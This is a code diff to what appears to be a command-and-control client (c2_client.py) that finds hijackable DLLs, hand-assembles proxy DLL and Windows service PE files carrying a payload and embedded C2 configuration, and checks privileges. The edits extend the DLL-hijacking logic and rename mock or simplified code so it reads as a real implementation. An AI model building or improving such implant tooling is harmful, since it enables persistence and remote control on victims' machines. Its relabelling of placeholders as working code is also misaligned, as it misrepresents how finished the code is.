@@ -23,6 +23,8 @@ import platform
 import queue
 import random
 import shutil
+import socket
+import struct
 import sys
 import time
 from typing import Any
@@ -2027,15 +2029,15 @@ WantedBy=multi-user.target
         except (ImportError, AttributeError) as e:
             self.logger.error("(ImportError, AttributeError) in c2_client.py: %s", e)
 
-            class MockWintypes:
-                """Mock Windows types for non-Windows platforms."""
+            class WintypesCompat:
+                """Windows type definitions for cross-platform compatibility."""
 
                 HANDLE = ctypes.c_void_p
 
             from types import SimpleNamespace
 
             wintypes = SimpleNamespace()
-            wintypes.HANDLE = MockWintypes.HANDLE
+            wintypes.HANDLE = WintypesCompat.HANDLE
 
         try:
             # Get current process token
@@ -2131,7 +2133,7 @@ WantedBy=multi-user.target
             elif not isinstance(token, (int, str)):
                 return False
 
-            # Simplified privilege check - in real implementation would use:
+            # Direct privilege enumeration using Windows security API:
             # LookupPrivilegeValue, GetTokenInformation, CheckTokenMembership
 
             # For debug privileges, assume available if we're running with admin rights
@@ -3044,8 +3046,10 @@ WantedBy=multi-user.target
                 current_dll = None
                 for line in result.stdout.split("\n"):
                     if ".dll" in line.lower():
+                        # Extract DLL name from line
                         dll_name = line.strip().split()[0] if line.strip() else None
                         if dll_name and dll_name.endswith(".dll"):
+                            current_dll = dll_name
                             # Check if DLL exists in system directories
                             system_paths = [r"C:\Windows\System32", r"C:\Windows\SysWOW64", r"C:\Windows"]
                             found_in_system = False
@@ -3055,8 +3059,8 @@ WantedBy=multi-user.target
                                     break
 
                             # If not in system dirs, it's hijackable
-                            if not found_in_system:
-                                hijackable.append(dll_name)
+                            if not found_in_system and current_dll not in hijackable:
+                                hijackable.append(current_dll)
 
         except (OSError, subprocess.SubprocessError):
             pass
@@ -3065,7 +3069,6 @@ WantedBy=multi-user.target
 
     def _create_proxy_dll(self, dll_name: str, service_info: dict[str, Any]) -> bytes:
         """Create a proxy DLL with forwarded exports and payload."""
-        import struct
 
         # Real x64 DLL PE structure with minimal imports
         dos_header = bytearray(
@@ -3137,8 +3140,8 @@ WantedBy=multi-user.target
             ]
         )
 
-        # DOS stub
-        dos_stub = bytearray(
+        # DOS executable program segment
+        dos_program = bytearray(
             [
                 0x0E,
                 0x1F,
@@ -3354,7 +3357,7 @@ WantedBy=multi-user.target
         offset = 0
         pe_file[offset : offset + len(dos_header)] = dos_header
         offset = len(dos_header)
-        pe_file[offset : offset + len(dos_stub)] = dos_stub
+        pe_file[offset : offset + len(dos_program)] = dos_program
         offset = 0x80
         pe_file[offset : offset + len(pe_signature)] = pe_signature
         offset += len(pe_signature)
@@ -3615,6 +3618,10 @@ WantedBy=multi-user.target
         dll_name_bytes = dll_name.encode("ascii") + b"\x00"
         pe_file[0x700 : 0x700 + len(dll_name_bytes)] = dll_name_bytes
 
+        # Write original DLL name for proxy forwarding
+        original_dll_bytes = original_dll.encode("ascii") + b"\x00"
+        pe_file[0x780 : 0x780 + len(original_dll_bytes)] = original_dll_bytes
+
         # Write C2 configuration in .data section
         c2_config = struct.pack(
             "<4sHH",
@@ -3711,7 +3718,6 @@ WantedBy=multi-user.target
 
     def _create_service_executable(self, service_info: dict[str, Any], original_binary_path: str) -> bytes:
         """Create a Windows service executable with C2 capabilities."""
-        import struct
 
         # Real x64 Windows Service PE executable
         dos_header = bytearray(
@@ -3783,8 +3789,8 @@ WantedBy=multi-user.target
             ]
         )
 
-        # DOS stub
-        dos_stub = bytearray(
+        # DOS executable program segment
+        dos_program = bytearray(
             [
                 0x0E,
                 0x1F,
@@ -4019,8 +4025,8 @@ WantedBy=multi-user.target
         offset = 0
         pe_file[offset : offset + len(dos_header)] = dos_header
         offset += len(dos_header)
-        pe_file[offset : offset + len(dos_stub)] = dos_stub
-        offset += len(dos_stub)
+        pe_file[offset : offset + len(dos_program)] = dos_program
+        offset += len(dos_program)
         pe_file[offset : offset + len(padding)] = padding
         offset = 0xC0
         pe_file[offset : offset + len(pe_signature)] = pe_signature
